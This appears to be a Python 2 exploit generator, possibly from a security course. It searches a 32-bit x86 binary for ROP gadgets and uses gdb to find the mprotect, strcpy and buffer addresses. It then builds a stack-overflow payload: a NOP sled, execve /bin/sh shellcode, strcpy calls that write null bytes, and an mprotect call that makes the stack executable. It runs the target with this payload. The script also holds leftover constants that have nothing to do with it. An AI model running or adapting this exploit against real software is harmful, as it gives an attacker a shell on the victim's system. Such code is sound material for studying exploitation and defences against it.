from capstone import *
from elftools.common.py3compat import bytes2str
from elftools.elf.elffile import ELFFile
import argparse
import struct
import subprocess
import os
import io
 
# 128k flash for the ATXmega128a4u
flashsize = 128 * 1024
libc_base_add = 0xb7e05000 

def __printSectionInfo (s):
    print ('[{nr}] {name} {type} {addr} {offs} {size}'.format(
                nr = s.header['sh_name'],
                name = s.name,
                type = s.header['sh_type'],
                addr = s.header['sh_addr'],
                offs = s.header['sh_offset'],
                size = s.header['sh_size']
                                                              )
           )

def check_null_bytes(address):
    packed_addr = struct.pack("<I", address)
    if '\x00' in packed_addr:
        return True
    return False

def get_binary_instr(filename):
    with open(filename, 'rb') as f:
        # read fbinary file 
        elffile = ELFFile(f)
        '''
        for s in elffile.iter_sections():
            __printSectionInfo(s)
        '''
        textSec = elffile.get_section_by_name(b'.text')
         
	    # the text section
        startAddr = textSec.header['sh_addr']
        val = textSec.data()

        md = Cs(CS_ARCH_X86, CS_MODE_32)
        md.detail = False 
        ret_index = []
        instr_list = []
        count = 0
        for instr in md.disasm(val, startAddr):
            instr_list.append(instr)
            if 'ret' in instr.mnemonic:
                ret_index.append(count)
            count = count + 1
	    
        '''print 'Found %d instructions with %d rets in binary %s' %(count, len(ret_index), filename)
	
        for instr in range(len(instr_list)):
            print("0x%x:\t%s\t%s" %(instr_list[instr].address, instr_list[instr].mnemonic, instr_list[instr].op_str))'''
        return (instr_list, ret_index)
    
    return (None, None)


def find_mprotect_addr(vuln_binary):

    with io.FileIO("find_functions.gdb", "w") as file:
        file.write("b main\nrun hello\np mprotect\np __strcpy_sse2\n")

    cmd = "gdb --batch --command=./find_functions.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello|grep mprotect|head -1|awk '{print $8}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    mprotect_addr = int(proc.stdout.read(), 16)

    os.remove("./find_functions.gdb")
    return mprotect_addr


def find_strcpy_addr(vuln_binary):

    with io.FileIO("find_functions.gdb", "w") as file:
        file.write("b main\nrun hello\np mprotect\np __strcpy_sse2\n")

    cmd = "gdb --batch --command=./find_functions.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello|grep __strcpy_sse2|head -1|awk '{print $8}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    strcpy_addr = int(proc.stdout.read(), 16)

    os.remove("./find_functions.gdb")
    return strcpy_addr 


def find_library_base_addr(vuln_binary, library_path):
    with io.FileIO("test.gdb", "w") as file:
        file.write("b main\nrun hello\ninfo proc mappings\n")

    cmd = "gdb --batch --command=./test.gdb --args "
    cmd = cmd + vuln_binary
    cmd = cmd + " hello|grep " + os.path.realpath(library_path) + "|head -1|awk '{print $1}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    try:
        library_base_addr = int(proc.stdout.read(), 16)
    except Exception as e:
    	print "Error finding library base address %s" %(str(e))
        return None

    os.remove("./test.gdb")
    return library_base_addr

def find_null_byte(filename, base_addr):

    print 'finding null byte in %s with base addr 0x%x' %(filename, base_addr)
    with open(filename, 'rb') as f:
        # read binary file 
        elffile = ELFFile(f)
        ro_section = elffile.get_section_by_name(b'.rodata')

        # the rodata section
        startAddr = ro_section.header['sh_addr']
        val = ro_section.data()
       
        found = False
        for i in range(len(val)):
            if val[i] == '\x00':
                startAddr = startAddr + 1
                found = True
                break

        if found == False:
            return None
        return (startAddr + base_addr)
    return None
 
'''
def find_null_byte(vuln_bin, base_addr):

    cmd = "ldd "
    cmd = cmd + vuln_bin
    cmd = cmd + "|grep libc|awk '{print $3}'"
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    libc_path = proc.stdout.read()

    strings_command = "strings -t x " + libc_path[:-1] + "|grep /bin/sh|awk '{print $1}'"
    proc = subprocess.Popen(strings_command, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    bin_sh_offset = int(proc.stdout.read(), 16)
    
    null_byte_location = base_addr + bin_sh_offset + len("/bin/sh")
    return null_byte_location
'''

def find_buff_addr(vuln_bin):

    with io.FileIO("find_buf.gdb", "w") as file:
        file.write("b strcpy\nrun hello\nfinish\np/x &buf[0]\n")
   
    cmd = "gdb --batch --command=./find_buf.gdb --args "
    cmd = cmd + vuln_bin
    cmd = cmd + " hello|tail -1|awk '{print $3}'"
    
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    proc.wait()
    buf_addr = int(proc.stdout.read(), 16) + 0x10 - 0x180

    os.remove("./find_buf.gdb")
    return buf_addr
 
def find_3pop_ret(instr_list, ret_index):
	# find pop, pop, pop, ret
    found = False
    for index in ret_index:
        temp_index = index - 1
        while True:
            if instr_list[temp_index].mnemonic == 'pop':
                temp_index = temp_index - 1
                if ((index - temp_index) == 3):
                    found = True
                    break
            else:
                break

        if found == True:
            break
		
    if found == True:
        return instr_list[temp_index].address
    else:
        return None


def find_2pop_ret(instr_list, ret_index):
    # find pop, pop, ret
    found = False
    for index in ret_index:
        temp_index = index - 1
        while True:
            if instr_list[temp_index].mnemonic == 'pop':
                temp_index = temp_index - 1
                if ((index - temp_index) == 2):
                    found = True
                    break
            else:
                break

        if found == True:
            break

    if found == True:
        return instr_list[temp_index].address
    else:
        return None
	
def find_inc_ret(instr_list, ret_index):
    # find inc eax, ret
    max_depth = 4
    for depth in range(1,max_depth):
        found = False
        for index in ret_index:
            temp_index = index - depth
            
            if not ('inc' in instr_list[temp_index].mnemonic and 'eax' in instr_list[temp_index].op_str):
                continue
            
            temp_index = temp_index + 1
            found = True
            while temp_index < index:
                if instr_list[temp_index].mnemonic != 'pop':
                    found = False
                    break
                temp_index = temp_index + 1

            if found == True:
                break

        if found == True:
            break

    if found == True:
        print 'Found inc eax,ret; at address 0x%x with depth = %d' %(instr_list[temp_index].address-2,depth)
        return (instr_list[temp_index].address-2)
    else:
        print 'inc eax gadget not found !'
        return None

def find_xor_ret(instr_list, ret_index):
    # find xor eax, eax, ret;
    max_depth = 4
    for depth in range(1,max_depth):
        found = False
        for index in ret_index:
            temp_index = index - depth

            if not ('xor' in instr_list[temp_index].mnemonic and 'eax, eax' in instr_list[temp_index].op_str):
                continue

            temp_index = temp_index + 1
            found = True
            while temp_index < index:
                if instr_list[temp_index].mnemonic != 'pop':
                    found = False
                    break
                temp_index = temp_index + 1

            if found == True:
                break

        if found == True:
            break

    if found == True:
        print 'Found xor eax, eax, ret; at address 0x%x with depth = %d' %(instr_list[temp_index].address-2,depth)
        return (instr_list[temp_index].address-2)
    else:
        print 'xor eax, eax, ret; gadget not found !'
        return None

def print_all_gadgets(instr_list, ret_index):
    # find all gadgets
    gadget_list = []
    for index in ret_index:
        max_depth = 4
        for depth in range(1,max_depth):

            temp_index = index - depth

            # check if this is jmp instruction
            if instr_list[temp_index].mnemonic[0] == 'J' or instr_list[temp_index].mnemonic[0] == 'j':
                break

            # check if this is not call instruction
            if instr_list[temp_index].mnemonic == 'call':
                break

            #check 0x00 in address
            if check_null_bytes(instr_list[temp_index].address):
                continue

            # add this to list of gadgets
            gadget_list.append(temp_index)

    print 'Found %d gadgets' %(len(gadget_list))
    for instr in gadget_list:
        temp_index = instr
        while True:
            print("0x%x:\t%s\t%s" %(instr_list[temp_index].address, instr_list[temp_index].mnemonic, instr_list[temp_index].op_str))
            if instr_list[temp_index].mnemonic == 'ret':
                print '------------'
                break
            temp_index = temp_index + 1

if __name__ == '__main__':

    parser = argparse.ArgumentParser('ROP-Chain-Compiler')
    parser.add_argument("vuln_bin", type=str, help="Path to 32 bit x86 binary which is to be exploited")
    parser.add_argument("-lib", type=str, help="Path to libraries which are linked along with base addresses")
    args = parser.parse_args()
    
    lib_list = []
    if args.lib:
        #print 'Optional libraries provided are %s' %(args.lib)
        libraries = args.lib.split(' ')
        for entry in libraries:
            instr, ret = get_binary_instr(entry)
            if instr == None or ret == None:
                print '%s library not present !' %(entry)
                exit(1)

            base_addr = find_library_base_addr(args.vuln_bin, entry)
            if base_addr == None:
                print 'Unable to get base address for library %s' %(entry)
                exit(1)
            lib_list.append((instr, ret, base_addr, entry))

    instr, ret = get_binary_instr(args.vuln_bin)
    if instr == None or ret == None:
        print '%s binary not present !' %(args.vuln_bin)
        exit(2)
    lib_list.append((instr, ret, 0, args.vuln_bin))
   
    for entry in lib_list:
        print 'Found %d instructions with %d rets' %(len(entry[0]), len(entry[1]))
 
    pop_pop_ret_addr = None
    for entry in lib_list:
        if len(entry) != 4:
            print 'Inconsistent entry in library structure !'
            exit(3)            

        instr = entry[0]
        ret = entry[1]
        
        if instr == None or ret == None:
            print 'Inconsistent data for libraries !'
            exit(3)

        result = find_2pop_ret(instr, ret)
        if result != None:
            pop_pop_ret_addr = result + entry[2]
            print 'Found 2 pop ret at address 0x%x' %(pop_pop_ret_addr)
            break

    if pop_pop_ret_addr == None:
        print 'Unable to find gadget with 2 pops !'
        exit(3)

    pop_pop_pop_ret_addr = None
    for entry in lib_list:
        if len(entry) != 4:
            print 'Inconsistent entry in library structure !'
            exit(4)

        instr = entry[0]
        ret = entry[1]

        if instr == None or ret == None:
            print 'Inconsistent data for libraries !'
            exit(4)

        result = find_3pop_ret(instr, ret)
        if result != None:
            pop_pop_pop_ret_addr = result + entry[2]
            print 'Found 3 pop ret at address 0x%x' %(pop_pop_pop_ret_addr)
            break

    if pop_pop_pop_ret_addr == None:
        print 'Unable to find gadget with 3 pops !'
        exit(4)

    mprotect_addr = find_mprotect_addr(args.vuln_bin)
    if mprotect_addr == None:
        print 'Unable to find address of mprotect system call !'
        exit(5)
    print 'mprotect address = 0x%x' %(mprotect_addr)

    strcpy_addr = find_strcpy_addr(args.vuln_bin)
    if strcpy_addr == None:
        print 'Unable to find address of strcpy function !'
        exit(6)
    print 'strcpy address = 0x%x' %(strcpy_addr)


    null_byte = find_null_byte(args.vuln_bin, 0)
    if null_byte == None:
        print 'Unable to find NULL byte in binary %s' %(args.vuln_bin)
        exit(4)
    print 'NULL byte address = 0x%x' %(null_byte)

    buf_addr = find_buff_addr(args.vuln_bin)
    if buf_addr == None:
        print 'Unable to find buffer address of vulnerable binary !'
        exit(9)
    print 'Buffer address of vulnerable binary is 0x%x' %(buf_addr)

    
    # build payload

    # JUNK + SYSTEM + EXIT + SYSTEM_ARG
    buf = "\x90" * 199
    buf += "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
    buf += struct.pack("<I",strcpy_addr) * 9

    constant = 0x17c
    buf += struct.pack("<I",strcpy_addr)
    buf += struct.pack("<I",pop_pop_ret_addr)
    buf += struct.pack("<I",buf_addr + constant)
    buf += struct.pack("<I",null_byte)

    buf += struct.pack("<I",strcpy_addr)
    buf += struct.pack("<I",pop_pop_ret_addr)
    buf += struct.pack("<I",buf_addr + constant + 4)
    buf += struct.pack("<I",null_byte)

    buf += struct.pack("<I",strcpy_addr)
    buf += struct.pack("<I",pop_pop_ret_addr)
    buf += struct.pack("<I",buf_addr + constant + 6)
    buf += struct.pack("<I",null_byte)

    buf += struct.pack("<I",strcpy_addr)
    buf += struct.pack("<I",pop_pop_ret_addr)
    buf += struct.pack("<I",buf_addr + constant + 7)
    buf += struct.pack("<I",null_byte)

    buf += struct.pack("<I",strcpy_addr)
    buf += struct.pack("<I",pop_pop_ret_addr)
    buf += struct.pack("<I",buf_addr + constant + 9)
    buf += struct.pack("<I",null_byte)

    buf += struct.pack("<I",strcpy_addr)
    buf += struct.pack("<I",pop_pop_ret_addr)
    buf += struct.pack("<I",buf_addr + constant + 0xa)
    buf += struct.pack("<I",null_byte)

    buf += struct.pack("<I",strcpy_addr)
    buf += struct.pack("<I",pop_pop_ret_addr)
    buf += struct.pack("<I",buf_addr + constant + 0xb)
    buf += struct.pack("<I",null_byte)

    page_address = ((buf_addr >> 12) << 12) + 0x7f
    mem_length = 0x7f7f107f
    permissions = 0x7f7f7f07
    return_address = buf_addr

    buf += struct.pack("<I",mprotect_addr)
    buf += struct.pack("<I",pop_pop_pop_ret_addr)
    buf += struct.pack("<I",page_address)
    buf += struct.pack("<I",mem_length)
    buf += struct.pack("<I",permissions)
    buf += struct.pack("<I",return_address)

    rows, columns = os.popen('stty size', 'r').read().split()
    print "#"*int(columns)
    print "Run the following command as the argument of vuln2 to reproduce this exploit.\n"
    print "#"*int(columns)
    bufstr = buf.encode("hex")
    i = 0
    exploit_str = ""
    while i < len(bufstr) - 1:
        exploit_str += "\\x" + bufstr[i] + bufstr[i+1]
        i += 2
    print "`python -c \'print \"" + exploit_str + "\"\'`"
    print ""
    print "#"*int(columns)

    subprocess.call([args.vuln_bin, buf])

